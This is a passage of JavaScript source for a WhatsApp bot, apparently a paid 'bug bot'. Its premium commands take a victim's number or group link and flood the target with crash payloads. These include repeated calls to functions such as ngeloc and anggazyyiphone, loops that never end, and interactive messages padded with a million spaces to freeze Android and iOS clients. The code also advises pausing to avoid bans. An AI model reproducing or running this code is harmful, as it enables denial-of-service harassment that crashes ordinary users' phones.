  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'internal-quoted': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'external-quoted': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 40; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = true
reply('succes')
}
break

case "hello": {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await xeonkillpic(from, oneclickxeon, amount)
await xeonkillpic(from, oneclickxeon, amount)
await xeonkillpic(from, oneclickxeon, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;

case '🌷': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;

case '🫣': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;

case '🦖': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;
case '☕': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;
case '❤': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;
case '💤': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;
case '🌀': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Use ${prefix+command}\nExample:  ${prefix+command},5`) 
reply('masi on c2? kah mas')
sleep(5000)
reply('*okee gass bang devill ⚡⚡⚡*')
sleep(4000)
amount = [1]
for (let i = 0; i < amount; i++) {
await ngeloc(from, anggazyycrash, amount)
await anggazyyiphone(from, amount)
await anggazyyiphone(from, amount)
await ngeloc(from, anggazyycrash, amount)
}
await reply(`*⚡* Telah dikirim. © Devil 4.0 *Gen 1*`)
}
break;
//=================================================//
case '💥': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//=================================================//
case '⭐': case '⚡': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 10; j++) {
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'bug-list': {
if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'bug-list': {
if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-external': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-internal': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-engine': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'buglist-crash': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
//=================================================//
case 'onekil': case 'doublekil': case '💀': case 'triplekill': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wtf': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'bug-meta': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//=================================================//
case 'unlimited-bug': case '😈': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (;;) {
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await sleep(30000)
}
}
break
case 'narutoreact': {

if (!isPremium) return reply(msg.anggazyyprem)

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await anggazyy.sendMessage(m.chat, { react: { text: '🪲', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
case 'React': {

if (!isPremium) return reply(msg.anggazyyprem)

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363297279563825@newsletter', newsletterName: `Ednut001`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await anggazyy.sendMessage(m.chat, { react: { text: '🍁', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'naruto-list': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 234xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
case 'enter-list': {


if (!isPremium) return reply(msg.anggazyyprem)

if (!text) return reply(`Example:\n${prefix + command} 234xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
  for (;;) {
    await ngeloc(target, angggazyyvault)
  }
}
break
//=================================================//
case 'ios-unlimited': case 'ios-ui': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(msg.wait)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await anggazyyiphone(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'ios-uicrash': case 'ios-infinity': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
reply(ppk + " detik");
reply(`In proses....`)
for (let j = 0; j < jumlah; j++) {
await anggazyyiphone(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-sitexyz': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'enemygroup': case 'bug-hole': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: angggazyyvault })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await anggazyy.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
anggazyy.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "joingc": case "join": {
if (!isOwner) return reply(msg.owner)
if (!text && !m.quoted) return reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await anggazyy.groupAcceptInvite(result).then(respon => reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => reply(error.toString()))
}
break
case "leave": case "leavegc": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
await reply("Otw Bosss")
await sleep(3000)
await anggazyy.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {
if (!isOwner) return reply(msg.owner)
let gcall = await Object.values(await anggazyy.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grup\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
anggazyy.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
